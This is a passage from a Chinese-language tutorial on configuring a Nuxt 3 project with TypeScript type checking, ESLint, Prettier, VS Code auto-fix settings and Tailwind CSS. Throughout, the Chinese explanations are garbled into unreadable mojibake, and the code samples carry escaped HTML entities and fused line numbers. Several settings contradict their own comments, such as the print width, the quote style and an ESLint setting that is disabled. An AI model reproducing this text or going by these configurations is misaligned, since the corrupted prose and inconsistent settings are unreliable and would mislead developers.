defineNuxtConfig({ typescript: { typeCheck: true } }) Step 4. é‡æ–°å•Ÿå‹•é–‹ç™¼ç’°å¢ƒæœå‹™ æˆ‘å€‘é‡æ–°åŸ·è¡Œ npm run dev -- -o ä¾†é‡å•Ÿé–‹ç™¼ç’°å¢ƒçš„æœå‹™ï¼Œé€™æ¨£å°±é…ç½®å®Œæˆå›‰ï¼\nçœ‹çœ‹æ•ˆæœ å¦‚æœæˆ‘å€‘åœ¨ app.vue å¯«äº†ä»¥ä¸‹ç¨‹å¼ï¼š\n1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtWelcome /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34; setup\u0026gt; const year: number = \u0026#39;2022\u0026#39; const title: string = `${year} iThome éµäººè³½` \u0026lt;/script\u0026gt; å¯ä»¥ç™¼ç¾çµ‚ç«¯æ©Ÿ (Terminal) å°±æŒ‡å‡ºäº†ä¸€å€‹éŒ¯èª¤çš„é¡å‹æŒ‡æ´¾ï¼Œä¸¦å‘ŠçŸ¥ä½ æœ‰éŒ¯èª¤ç¨‹å¼ç¢¼çš„ä½ç½®ã€‚\nESLint è¨­ç½® Linter ESLint æ˜¯ä¸€å€‹ JavaScript Linterï¼Œå®ƒç”¨ä¾†æª¢æŸ¥ JavaScript Coding Style çš„å·¥å…·ï¼Œä¸»è¦èƒ½å¹«ä½ åˆ†æä¸¦æ‰¾åˆ°èªæ³•éŒ¯èª¤ï¼Œä¹Ÿèƒ½ç”¨ä¾†çµ±ä¸€é¢¨æ ¼ï¼Œä¾‹å¦‚ï¼šç¸®æ’ç©ºç™½æ•¸ã€å­—ä¸²è¦ç”¨å–®å¼•è™Ÿæˆ–é›™å¼•è™Ÿç­‰ï¼Œæé†’ä½ åˆªæ‰å¤šé¤˜ç¨‹å¼ç¢¼æˆ–éµç…§æœ€ä½³çš„å¯¦è¸æ–¹å¼ï¼Œç¢ºä¿ç¨‹å¼ç¢¼èƒ½å…·æœ‰ä¸€å®šçš„æ°´æº–ã€‚åœ¨åœ˜éšŠå”ä½œä¸‹ ESLint æ›´èƒ½è®“å¤§å®¶æ’°å¯«ç¨‹å¼ç¢¼æ™‚éµç…§è¦å‰‡ï¼Œç¢ºä¿ç¨‹å¼ç¢¼å“è³ªã€‚ESLint é™¤äº†æä¾›ä½ å¯ä»¥ä½¿ç”¨å¤§å…¬å¸å¦‚ Googleã€Airbnb ç­‰çš„è¦å‰‡é…ç½®ä¾†ä½œç‚ºæª¢æŸ¥åŸºæº–ï¼Œä¹Ÿå¯ä»¥å®¢è£½è‡ªè¨‚å‡ºè‡ªå·±å–œå¥½æˆ–åœ˜éšŠå…±è­˜çš„è¦å‰‡ä¾†åˆ†æèˆ‡æé†’ä½ æ ¡æ­£èªæ³•ã€‚\nStep 1. å®‰è£ ESLint å¥—ä»¶ ç¾åœ¨æˆ‘å€‘è‡³ Nuxt å°ˆæ ¹ç›®éŒ„ä¸‹ï¼Œé–‹å§‹å®‰è£ ESLint ç›¸é—œå¥—ä»¶ï¼Œç•¶ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥æŒ‘è‡ªå·±å–œæ­¡çš„é€²è¡Œé…ç½®ï¼Œä¸éåœ¨é€™è£¡é¸æ“‡ä»¥ Nuxt 3 å®˜æ–¹æä¾›çš„ ESLint è¨­å®šä¾†åšæ¨™æº–é…ç½®ï¼Œä¸¦æ·»åŠ æ”¯æ´ Vue 3 çš„ ESLint è¨­å®šã€‚\n1 2 3 npm install -D eslint @nuxtjs/eslint-config-typescript eslint-plugin-vue # or # yarn add -D eslint @nuxtjs/eslint-config-typescript eslint-plugin-vue Step 2. é…ç½® ESLint è¨­å®šæª” å®‰è£å®Œæ‰€éœ€å¥—ä»¶å¾Œï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘å°±å¯ä»¥ä¾†è¨­å®š ESLintï¼Œæˆ‘å€‘åœ¨å°ˆæ¡ˆæ ¹ç›®éŒ„ä¸‹å»ºç«‹ .eslintrc.js æª”æ¡ˆï¼Œå…§å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 module.exports = { env: { browser: true, es2021: true }, extends: [\u0026#39;@nuxtjs/eslint-config-typescript\u0026#39;, \u0026#39;plugin:vue/vue3-recommended\u0026#39;], parserOptions: { ecmaVersion: 13, sourceType: \u0026#39;module\u0026#39; }, plugins: [], rules: {}, overrides: [ { files: [ \u0026#39;**/pages/**/*.{js,ts,vue}\u0026#39;, \u0026#39;**/layouts/**/*.{js,ts,vue}\u0026#39;, \u0026#39;**/app.{js,ts,vue}\u0026#39;, \u0026#39;**/error.{js,ts,vue}\u0026#39; ], rules: { \u0026#39;vue/multi-word-component-names\u0026#39;: \u0026#39;off\u0026#39; } } ] } åœ¨æˆ‘å€‘å»ºç«‹çš„ .eslintrc.js æª”æ¡ˆä¸­ extends å¯ä»¥æ˜¯ä¸€å€‹é™£åˆ—ï¼Œä¸»è¦æ˜¯ä¾†æ”¾ç½®æ“´å±• ESLint çš„è¦å‰‡çš„é…ç½®ï¼Œé€™è£¡ç¨å¾®æ³¨æ„ä¸€ä¸‹é †åºå¦‚ä¸‹ï¼š\n@nuxtjs/eslint-config-typescriptï¼šå°æ‡‰ @nuxtjs/eslint-config-typescript å¥—ä»¶ï¼Œç”± Nuxt å®˜æ–¹æä¾›ç”¨æ–¼ Nuxt çš„ ESLint è¦å‰‡é…ç½®ã€‚å¦‚æœä½ ä¸æ˜¯ä½¿ç”¨ TypeScript å¯ä»¥ä½¿ç”¨ @nuxtjs/eslint-configã€‚\nplugin:vue/vue3-recommendedï¼šå°æ‡‰ eslint-plugin-vue å¥—ä»¶ï¼Œç”± Vue.js å®˜æ–¹æä¾›çš„ ESLint æ’ä»¶ï¼ŒåŒ…å«äº†èƒ½é…åˆ Vue SFC èªæ³•åŠç‰¹æ€§çš„è¦å‰‡ï¼Œä¹Ÿå¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ï¼Œä¾æ“šéœ€æ±‚ç¨ä½œèª¿æ•´ã€‚\nå°‡ç‰¹å®šç›®éŒ„ä¸‹çš„æª”æ¡ˆé—œé–‰ vue/multi-word-component-names è¦å‰‡ï¼Œä»¥æ­¤ä¾†å› æ‡‰ nuxt çš„é–‹ç™¼é¿å…æç¤ºéŒ¯èª¤ã€‚\nå› ç‚ºç›®å‰ @nuxtjs/eslint-config-typescript æ˜¯åŸºæ–¼ @nuxtjs/eslint-config ä¾†æ“´å±• TypeScript çš„è¨­å®šï¼Œè€Œä¸” @nuxtjs/eslint-config åŒ…å«çš„æ˜¯ Vue 2 çš„ ESLint è¨­å®šï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦å†é¡å¤–å®‰è£ eslint-plugin-vue ä¾†æ“´å±• Vue 3 è¦å‰‡é…ç½®ï¼Œä¸¦è¦†å¯« vue/multi-word-component-names è¦å‰‡ã€‚\nç”¨ ESLint ä¾†å˜—è©¦æª¢æŸ¥ é¦–å…ˆï¼Œæˆ‘å€‘ç·¨è¼¯ app.vue æª”æ¡ˆå…§å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtWelcome /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34; setup\u0026gt; const year: number = 2022 const title: string = `${year} iThome éµäººè³½` \u0026lt;/script\u0026gt; æ¥è‘—æˆ‘å€‘åŸ·è¡Œä¸‹åˆ—æŒ‡ä»¤ä¾†ä½¿ç”¨ eslint æª¢æŸ¥ app.vue é€™å€‹æª”æ¡ˆã€‚\n1 npx eslint -- app.vue å¯ä»¥çœ‹åˆ°ä¸‹åœ–ï¼ŒESLint æŒ‡å‡º app.vue çš„å•é¡Œï¼Œåœ¨ç¬¬ 9 è¡Œä¸­çš„ title é€™å€‹è®Šæ•¸å·²ç¶“å®£å‘Šäº†å»æ²’æœ‰è¢«ä½¿ç”¨ã€‚\né€™å€‹éŒ¯èª¤è¨Šæ¯æ­£æ˜¯ä¾æ“šä¸Šé¢æˆ‘å€‘çš„ ESLint é…ç½®æ‰€è¢«æª¢è¦–å‡ºä¾†çš„ï¼Œåœ¨ ESLint è¦å‰‡å®šç¾©å¥½å¾Œï¼Œä¹Ÿæœ‰åˆ†æˆéŒ¯èª¤ (Error) èˆ‡è­¦å‘Š (Warning)ï¼Œæˆ‘å€‘å¯ä»¥å†ä¾æ“š ESLint çµ¦äºˆçš„æç¤ºé€²è¡Œèª¿æ•´èˆ‡ä¿®æ­£ã€‚\næˆ‘å€‘å˜—è©¦ä¿®æ­£ä¸€ä¸‹ app.vue é€™å€‹æª”æ¡ˆï¼Œåœ¨ template ä¸­ä½¿ç”¨ title é€™å€‹è®Šæ•¸ã€‚\n1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;{{ title }}\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34; setup\u0026gt; const year: number = 2022 const title: string = `${year} iThome éµäººè³½` \u0026lt;/script\u0026gt; å†ä¸€æ¬¡åŸ·è¡Œ npx eslint -- app.vueï¼Œå°±æœƒç™¼ç¾æ²’æœ‰éŒ¯èª¤è¨Šæ¯ç”¢ç”Ÿå›‰ï¼\nåœ¨ package.json è¨­ç½®è…³æœ¬ æˆ‘å€‘é™¤äº†é€å€‹æª”æ¡ˆåšæª¢æŸ¥ï¼Œä¹Ÿå¯ä»¥è¨­ç½®è…³æœ¬ä¾†æª¢æŸ¥æ•´å€‹å°ˆæ¡ˆç›®éŒ„ä¸‹çš„ç¨‹å¼ç¢¼ã€‚\nåœ¨ package.json çš„ scripts è…³æœ¬ä¸­ï¼Œæˆ‘å€‘å¯ä»¥æ–°å¢ä¸€å€‹æŒ‡ä»¤ \u0026quot;lint\u0026quot;: \u0026quot;eslint --ext .ts,.js,.vue .\u0026quot;ï¼Œé€™æ¨£ä¸€ä¾†æˆ‘å€‘å°±å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤ä¾†æª¢æŸ¥å°ˆæ¡ˆç›®éŒ„ä¸‹çš„æ‰€æœ‰åŒ…å« .tsã€.jsã€.vue å‰¯æª”åçš„æª”æ¡ˆã€‚\n1 2 3 npm run lint # or # yarn run lint åœ¨ VS Code ä¸­é¡¯ç¤º ESLint éŒ¯èª¤æˆ–è­¦å‘Š æ¨è–¦å¤§å®¶å®‰è£ VS Code çš„ ESLint æ’ä»¶ï¼š\nESLintï¼šè®“ä½ åœ¨ç·¨è¼¯å™¨é–‹ç™¼æ™‚å°±èƒ½æœ‰æŒ‡ä»¤æª¢æŸ¥ï¼Œæ›´å¯ä»¥åšåˆ°å…¨åŸŸæˆ–ç‰¹å®šå·¥ä½œå€é–‹å•Ÿå„²å­˜æˆ–å¿«æ·éµè‡ªå‹•ä¿®æ­£ç¨‹å¼ç¢¼ç­‰è¨­ç½®ã€‚ å®‰è£å®Œç•¢å¾Œï¼Œå»ºè­°é‡å•Ÿ VS Code ä¾†é‡æ–°è¼‰å…¥ç›¸é—œè¨­å®šã€‚\nç¾åœ¨ï¼Œä½ æœƒç™¼ç¾åœ¨ VS Code ä¸­ç·¨è¼¯ç¨‹å¼çš„éç¨‹ä¸­ï¼Œå¦‚æœæœ‰ ESLint æª¢æŸ¥åˆ°çš„éŒ¯èª¤æˆ–å»ºè­°ï¼Œå°±æœƒå‡ºç¾ç´…è‰²æˆ–é»ƒè‰²çš„æ³¢æµªåº•ç·šï¼Œç•¶æ»‘é¼ æŒ‡æ¨™ç§»å‹•è‡³æ³¢æµªåº•ç·šè™•ï¼Œå°±æœƒç™¼ç¾æœ‰å€‹å°è¦–çª—æç¤ºä½ éŒ¯èª¤æˆ–è­¦å‘Šçš„åŸå› æ˜¯ä»€éº¼ã€‚\nåœ¨ VS Code ä¸­è‡ªå‹•ä¿®æ­£ ESLint éŒ¯èª¤æˆ–è­¦å‘Š åœ¨æŸäº›æƒ…æ³ï¼ŒESLint å¯ä»¥å¹«åŠ©ä½ åšè‡ªå‹•ä¿®æ­£ç¨‹å¼ç¢¼ï¼Œç”šè‡³åœ¨å­˜æ“‹æ™‚å°‡éŒ¯èª¤éƒ¨åˆ†ç›´æ¥é€²è¡Œä¿®æ­£ã€‚\næ‰‹å‹•å¿«é€Ÿä¿®æ­£ æˆ‘å€‘å¯ä»¥åœ¨ç·¨è¼¯å™¨å°‡æ»‘é¼ æŒ‡æ¨™ç§»å‹•è‡³æ³¢æµªåº•ç·šé»æ“Šã€Œå¿«é€Ÿä¿®æ­£ (Quick Fix)\u0026hellip;ã€ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ç·¨è¼¯å™¨å»ºè­°çš„å¿«æ·éµ Command + . (macOS)ï¼Œæ­¤æ™‚å°±èƒ½é¸æ“‡è¦ä¿®å¾©æˆ–é—œé–‰ç•¥ééŒ¯èª¤åŸå› ï¼›é€™è£¡æˆ‘å€‘é¸æ“‡ã€ŒFix all auto-fixable problemsã€ï¼Œä¾†ä¿®å¾©æ‰€æœ‰å¯èƒ½å¯ä»¥è¢«è‡ªå‹•ä¿®å¾©çš„å•é¡Œã€‚\nå­˜æ“‹è‡ªå‹•ä¿®æ­£ é™¤äº†æ‰‹å‹•å¿«é€Ÿä¿®æ­£å¤–ï¼Œä½ ä¹Ÿå¯ä»¥é€éæ·»åŠ  VS Code çš„è¨­å®šæª”ï¼Œå¦‚å°ˆæ¡ˆç›®éŒ„ä¸‹æ–°å¢ .vscode/settings.jsonï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;editor.formatOnSave\u0026#34;: true, \u0026#34;prettier.semi\u0026#34;: false, \u0026#34;files.trimTrailingWhitespace\u0026#34;: true, \u0026#34;editor.defaultFormatter\u0026#34;: \u0026#34;esbenp.prettier-vscode\u0026#34;, \u0026#34;editor.codeActionsOnSave\u0026#34;: { \u0026#34;source.fixAll.eslint\u0026#34;: true }, \u0026#34;eslint.format.enable\u0026#34;: true, \u0026#34;eslint.validate\u0026#34;: [\u0026#34;javascript\u0026#34;, \u0026#34;javascriptreact\u0026#34;, \u0026#34;html\u0026#34;, \u0026#34;vue\u0026#34;, \u0026#34;typescript\u0026#34;, \u0026#34;typescriptreact\u0026#34;], \u0026#34;eslint.enable\u0026#34;: false } ç•¶æˆ‘å€‘ç·¨è¼¯å®Œç¨‹å¼ç¢¼ï¼Œä¸¦ä¿å­˜æª”æ¡ˆæˆ–å¿«æ·éµå­˜æ“‹ Command + S (macOS)ï¼Œå°±æœƒè§¸ç™¼ ESLint è‡ªå‹•ä¿®å¾©å›‰ã€‚\nPrettier è¨­ç½® Prettier æ˜¯ç¨‹å¼ç¢¼æ ¼å¼åŒ–çš„å·¥å…·ï¼Œä¹Ÿå¯ä»¥èˆ‡ ESLint é€²è¡Œæ­é…ï¼ŒESLint èˆ‡ Prettier å°±èƒ½å„å¸å…¶è·å°‡ JaveScript èˆ‡ Vue ç­‰æª”æ¡ˆä¾ç…§é…ç½®é€²è¡Œæª¢æŸ¥èˆ‡æ’ç‰ˆã€‚\nStep 1. å®‰è£ Prettier å¥—ä»¶ æˆ‘å€‘ç›´æ¥å®‰è£ prettierã€eslint-config-prettier èˆ‡ eslint-plugin-prettier ä¸‰å€‹å¥—ä»¶ã€‚\n1 2 3 npm install -D prettier eslint-config-prettier eslint-plugin-prettier # or # yarn add -D prettier eslint-config-prettier eslint-plugin-prettier Step 2. é…ç½® Prettier è¨­å®šæª”æ¡ˆ æˆ‘å€‘åœ¨å°ˆæ¡ˆæ ¹ç›®éŒ„ä¸‹å»ºç«‹ .prettierrc.js æª”æ¡ˆï¼Œå…§å®¹å¦‚ä¸‹ï¼Œé€™äº›é…ç½®éƒ½å¯ä»¥è‡ªå·±è¨­å®šä¾†é…åˆ ESLintï¼Œæ›´å¤šé¸é …æˆ–èªªæ˜å¯ä»¥åƒè€ƒ Prettier å®˜æ–¹èªªæ˜æ–‡ä»¶ã€‚\n1 2 3 4 5 6 7 8 module.exports = { printWidth: 120, // æ¯è¡Œæ–‡å­—æ•¸é‡é” 100 å­—å…ƒå°±æ›åˆ°æ–°çš„ä¸€è¡Œ semi: false, // æ¯å€‹èªå¥çš„çµå°¾ä¸éœ€è¦åˆ†è™Ÿ singleQuote: false, // å­—ä¸²ä½¿ç”¨å–®å¼•è™Ÿï¼Œè€Œä¸æ˜¯é›™å¼•è™Ÿ trailingComma: \u0026#34;none\u0026#34;, // å¦‚ Objectã€Array å…§çš„å…ƒç´ ä¸éœ€è¦å°¾éš¨é€—è™Ÿ endOfLine: \u0026#34;auto\u0026#34;, vueIndentScriptAndStyle: true } Step 3. é…ç½® ESLint è¨­å®šæª”æ¡ˆ æˆ‘å€‘åœ¨å®‰è£æ™‚å¤šè£äº†å…©å€‹ ESLint ç›¸é—œå¥—ä»¶ï¼Œåˆ†åˆ¥ç‚º eslint-config-prettier åŠ eslint-plugin-prettierã€‚\nå°æ­¤æˆ‘å€‘éœ€è¦å°‡å…¶æ·»åŠ è‡³ ESLint çš„ .eslintrc.js è¨­å®šæª”å…§ï¼Œåœ¨ extends æ·»åŠ å­—ä¸² prettier è¡¨ç¤ºä½¿ç”¨ eslint-config-prettier æ“´å……é…ç½®ï¼Œä¸»è¦ç”¨ä¾†é˜²æ­¢ Prettier æ’ç‰ˆèˆ‡ ESLint ç™¼ç”Ÿè¡çªï¼Œè®“å…¶å¯ä»¥ç”¨ä¾†ç¦ç”¨ ESLint çš„æ ¼å¼åŒ–ï¼›æ¥è‘—åœ¨ plugins ä¸­æ·»åŠ  prettier å­—ä¸²è¡¨ç¤ºä½¿ç”¨ eslint-plugin-prettier å¥—ä»¶æ“´å……ï¼Œè®“ ESLint å¯ä»¥æç¤ºæˆ‘å€‘æ ¼å¼æœ‰éŒ¯èª¤çš„åœ°æ–¹ã€‚\nç‚ºäº†è®“ Prettier èˆ‡ ESLint æœ‰æ›´å¥½çš„æ­é…ï¼Œåœ¨ rules çš„åƒæ•¸ä¸­è¨˜å¾—æ·»åŠ  'prettier/prettier': 'error' è®“ ESLint å¯ä»¥æç¤º Prettier çš„æ’ç‰ˆç•°å¸¸æç¤ºä¾›æˆ‘å€‘åšä¿®æ­£ï¼Œè‡³æ­¤ .eslintrc.js è¨­å®šæª”æ‡‰è©²æœƒå¦‚ä¸‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 module.exports = { env: { browser: true, es2021: true }, extends: [ \u0026#39;@nuxtjs/eslint-config-typescript\u0026#39;, \u0026#39;plugin:vue/vue3-recommended\u0026#39;, \u0026#39;prettier\u0026#39; ], parserOptions: { ecmaVersion: 13, sourceType: \u0026#39;module\u0026#39; }, plugins: [\u0026#39;prettier\u0026#39;], rules: { \u0026#39;prettier/prettier\u0026#39;: \u0026#39;error\u0026#39; }, overrides: [ { files: [ \u0026#39;**/pages/**/*.{js,ts,vue}\u0026#39;, \u0026#39;**/layouts/**/*.{js,ts,vue}\u0026#39;, \u0026#39;**/app.{js,ts,vue}\u0026#39;, \u0026#39;**/error.{js,ts,vue}\u0026#39; ], rules: { \u0026#39;vue/multi-word-component-names\u0026#39;: \u0026#39;off\u0026#39; } } ] } Step 4. å®‰è£ VS Code çš„ Prettier æ’ä»¶ Prettier - Code formatterï¼šæä¾›æˆ‘å€‘åšç¨‹å¼ç¢¼çš„æ ¼å¼åŒ–ï¼Œæœ€é‡è¦çš„æ˜¯ä¾†å”åŠ©æˆ‘å€‘è‡ªå‹•è¼‰å…¥ .prettierrc.js é…ç½®ã€‚ å®‰è£å®Œç•¢å¾Œï¼Œå»ºè­°é‡å•Ÿ VS Code ä¾†é‡æ–°è¼‰å…¥ç›¸é—œè¨­å®šã€‚\næˆ‘å€‘å®Œæˆäº† TypeScript èˆ‡ Linter çš„é…ç½®ï¼Œé›–ç„¶é…ç½®æœ‰äº›ç¹ç‘£ï¼Œä½†å¯«ç¨‹å¼çš„é¢¨æ ¼æœ‰å€‹æ¨™æº–åŠè¦å‰‡ä¾å¾ªï¼Œè‚¯å®šèƒ½å”åŠ©ä½ å¯«å‡ºä»¤äººè®šå˜†çš„å®Œç¾çš„ç¨‹å¼ç¢¼ã€‚\nä½¿ç”¨ Tailwind CSS ç‚ºäº†å¾ŒçºŒç¯„ä¾‹ç¨‹å¼åœ¨é é¢å‘ˆç¾ä¸Šèƒ½æœ‰æ¯”è¼ƒå¥½çœ‹çš„æ¨£å¼ï¼ŒåŸå…ˆæœ‰æƒ³éä½¿ç”¨ UI æ¡†æ¶æˆ–ç´”å¯« CSSï¼Œä½†æ˜¯ç¸½è¦ºå¾—å¥½åƒä¸å¤ æ½®ï¼Œæ‰€ä»¥å‘¢ï¼Œæˆ‘æ±ºå®šå¸¶å…¥è¿‘å¹´æ»¿ç†±é–€çš„ CSS æ¡†æ¶ Tailwind CSSï¼Œåœ¨æœ¬ç¯‡æ–‡ç« æˆ‘å°±ä¸å†å¤šèŠ±ç¯‡å¹…ä»‹ç´¹ Tailwind çš„èªæ³•åŠæŒ‡ä»¤ç­‰ï¼Œä¸»è¦é‡å° Nuxt 3 å¦‚ä½•å°å…¥ Tailwind CSS è‡³å°ˆæ¡ˆå…§ä½¿ç”¨ã€‚\nå…¶å¯¦æœ‰ç¨å¾®ç³¾çµä¸€ä¸‹è¦ä¸è¦ä½¿ç”¨ Master CSSï¼Œé›–ç„¶æœ€å¾Œæ±ºå®šå…ˆç·©ç·©ï¼Œä½†æˆ‘èªç‚ºå®ƒéå¸¸æœ‰æ·ºåŠ›æˆç‚ºé€™é¡æ¡†æ¶çš„éœ¸ä¸»ï¼Œå¤§å®¶æœ‰ç©ºä¹Ÿå¯ä»¥æ”¯æŒä¸€ä¸‹æˆ–ç©ç©é€™å€‹ç”±è‡ºç£åœ˜éšŠé–‹ç™¼çš„ CSS æ¡†æ¶å“¦ï¼\nTailwind CSS æ˜¯è¿‘å¹´æ»¿ç†±é–€çš„ Utility-First CSS æ¡†æ¶ï¼Œæ›¾æ€èµ·ä¸€ç•ªè«–æˆ°èªª Class ä¸æ˜¯è®“ä½ é€™æ¨£ç”¨çš„ä¹‹é¡çš„æ‰¹è©•åŠç¼ºé»ï¼Œä½†å¦‚æœä½ æ·±å…¥æš¸è§£å®ƒå¾Œï¼Œç¢ºå¯¦ä¸å¯å¦èªå®ƒèƒ½ç‚ºä½ å¸¶ä¾†æ›´å¥½çš„ç”Ÿç”¢æ•ˆç‡ç­‰è«¸å¤šå„ªé»ã€‚\næ¥ä¸‹ä¾†ï¼Œæˆ‘æœƒåˆ†åˆ¥ä»‹ç´¹å…©ç¨®å°å…¥ Tailwind CSS æ–¹å¼ï¼Œåˆ†åˆ¥ç‚º Nuxt Community é‡‹å‡ºçš„ Tailwind CSS æ•´åˆæ¨¡çµ„ åŠ Tailwind CSS å®˜æ–¹æŒ‡å¼•æ­¥é©Ÿï¼Œä»¥ä¸‹çš„ A æˆ– B å…©ç¨®å°å…¥æ–¹å¼ï¼Œå¤§å®¶åªè¦æ“‡ä¸€å°±å¯ä»¥äº†ã€‚\nä½¿ç”¨ Nuxt Tailwind æ¨¡çµ„ Step 1. å®‰è£ç›¸é—œå¥—ä»¶ é¦–å…ˆå®‰è£ @nuxtjs/tailwindcssã€‚\n1 2 3 npm install -D @nuxtjs/tailwindcss # or # yarn add -D @nuxtjs/tailwindcss Step 2. æ·»åŠ æ¨¡çµ„è‡³ nuxt.config.ts æ‰“é–‹ ./nuxt.config.ts å°‡ @nuxtjs/tailwindcss æ¨¡çµ„æ·»åŠ è‡³ modules è¨­å®šåƒæ•¸ä¸­ï¼Œå®Œæˆå¾Œçœ‹èµ·ä¾†æœƒåƒä¸‹é¢é€™æ¨£ã€‚\n1 2 3 4 5 6 7 // https://v3.nuxtjs.org/api/configuration/nuxt.config export default defineNuxtConfig({ modules: [\u0026#39;@nuxtjs/tailwindcss\u0026#39;], typescript: { typeCheck: true } }) Step 3. é‡å•Ÿ Nuxt æœå‹™ é‡æ–°å•Ÿå‹•æˆ‘å€‘çš„ Nuxt æœå‹™ã€‚\n1 2 3 npm run dev -- -o # or # yarn run dev -- -o ä½¿ç”¨ @nuxtjs/tailwindcss åªéœ€è¦å…©å€‹æ­¥é©Ÿå°±å®Œæˆäº† Tailwind CSS çš„é…ç½®ï¼Œé€™å€‹æ¨¡çµ„å·²ç¶“åŒ…å«æ‰‹å‹•å®‰è£æ™‚éœ€è¦å»ºç«‹çš„ Tailwind CSS æŒ‡ä»¤ tailwindcss.css éœ€è¦çš„å…¨åŸŸè¨­å®šèˆ‡ PostCSS åƒæ•¸é¸é …ï¼ŒåŒæ™‚ä¹Ÿé è¨­äº† tailwind.config.js çš„ç›¸é—œ content ç›®éŒ„è·¯å¾‘ï¼Œè©³ç´°å¯ä»¥åƒè€ƒ Nuxt Tailwindã€‚\næ“´å……æˆ–è¦†å¯« @nuxtjs/tailwindcss é…ç½® å¦‚æœä½ æ²’æœ‰ç‰¹åˆ¥éœ€è¦æ“´å……æˆ–è¦†å¯«è¨­å®šå¯ä»¥è·³éé€™ä¸€æ®µã€‚\nå°ˆæ¡ˆå…§è‹¥ä½¿ç”¨ @nuxtjs/tailwindcss æ¨¡çµ„ï¼Œé€™å…©å€‹ tailwind.css èˆ‡ tailwind.config.js æª”æ¡ˆå…¶å¯¦æ¨¡çµ„å·²ç¶“æœ‰é è¨­ï¼Œä¸éœ€è¦æ‰‹å‹•å»ºç«‹ï¼Œtailwind.css å°æ‡‰æ¨¡çµ„å…§çš„ tailwind.css å¯ä»¥åƒè€ƒå°ˆæ¡ˆæª”æ¡ˆå…§å®¹ tailwind.cssï¼Œtailwind.config.js å‰‡æ˜¯é€éæ¨¡çµ„å‹•æ…‹æ–°å¢é…ç½®ã€‚\nå€˜è‹¥æƒ³è¦ä¿®æ”¹ä¹Ÿå¯ä»¥é€éå»ºç«‹è¨­å®šæª”æ¡ˆä¾†æ–°å¢æˆ–è¦†å¯«é è¨­å®šï¼Œä¾‹å¦‚åœ¨å°ˆæ¡ˆä¸‹åˆ†åˆ¥å»ºç«‹ tailwind.css èˆ‡ tailwind.config.js å…©å€‹æª”æ¡ˆï¼š\ntailwind.css å°ˆæ¡ˆç›®éŒ„ä¸‹è‹¥å­˜åœ¨è·¯å¾‘æª”åä¸€è‡´çš„ ./assets/css/tailwind.css æª”æ¡ˆï¼Œ@nuxtjs/tailwindcss å°±æœƒä»¥é€™å€‹æª”æ¡ˆå–ä»£æ¨¡çµ„å…§é è¨­çš„ tailwind.css æª”æ¡ˆã€‚\ntailwind.css é è¨­å…§å®¹å¦‚ä¸‹ï¼š\n1 2 3 @tailwind base; @tailwind components; @tailwind utilities; å¦‚æœæœ‰æˆåŠŸè¦†è“‹é…ç½®ï¼Œåœ¨é‡å•Ÿ Nuxt 3 æœå‹™æ™‚ï¼ŒTerminal æœƒæç¤ºä¸‹åˆ—å­—ä¸²ï¼Œè¡¨ç¤ºä½¿ç”¨äº†è‡ªè¨‚çš„ tailwind.cssã€‚\n1 Using Tailwind CSS from ~/assets/css/tailwind.css tailwind.config.js å°ˆæ¡ˆç›®éŒ„ä¸‹è‹¥å­˜åœ¨ tailwind.config.js æª”æ¡ˆå°±æœƒä»¥æ–°çš„é…ç½®æ‹“å±•æˆ–è¦†å¯« @nuxtjs/tailwindcss é è¨­çš„ tailwind.configã€‚\nä¾‹å¦‚ï¼Œæˆ‘å€‘æƒ³æ‹“å±•æˆ–è¦†å¯« content çš„é…ç½®ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /** @type {import(\u0026#39;tailwindcss\u0026#39;).Config} */ module.exports = { content: [ \u0026#39;./components/**/*.{vue,js,ts}\u0026#39;, \u0026#39;./layouts/**/*.vue\u0026#39;, \u0026#39;./pages/**/*.vue\u0026#39;, \u0026#39;./composables/**/*.{js,ts}\u0026#39;, \u0026#39;./plugins/**/*.{js,ts}\u0026#39;, \u0026#39;./app.{js,ts,vue}\u0026#39; ], theme: { extend: {} }, plugins: [] } Tailwind CSS å®˜æ–¹æŒ‡å¼•æ­¥é©Ÿ å¦‚æœä½ å·²ç¶“ä½¿ç”¨äº† @nuxtjs/tailwindcss é€²è¡Œé…ç½®ï¼Œå‰‡å¯ä»¥è·³éé€™ä¸€æ®µã€‚\nStep 1. å®‰è£ç›¸é—œå¥—ä»¶ é¦–å…ˆé€²å…¥æˆ‘å€‘çš„ Nuxt å°ˆæ¡ˆç›®éŒ„ï¼Œä¸¦å®‰è£ Tailwind CSS æœƒä½¿ç”¨åˆ°çš„ä¸€äº›ç›¸é—œå¥—ä»¶ã€‚\n1 2 3 npm install -D tailwindcss postcss@latest postcss-custom-properties@latest autoprefixer@latest # or # yarn add -D tailwindcss postcss@latest postcss-custom-properties@latest autoprefixer@latest Step 2. å»ºç«‹ tailwind.config.js å®‰è£å®Œå¥—ä»¶å¾Œï¼Œå¯ä»¥åŸ·è¡Œä¸‹åˆ—æŒ‡ä»¤é€²è¡Œåˆå§‹åŒ–ï¼Œå®Œæˆå¾Œæœƒåœ¨å°ˆæ¡ˆæ ¹ç›®éŒ„ä¸‹ç”¢ç”Ÿä¸€å€‹åç‚º tailwind.config.js çš„ Tailwind CSS è¨­å®šæª”ã€‚\n1 npx tailwindcss init 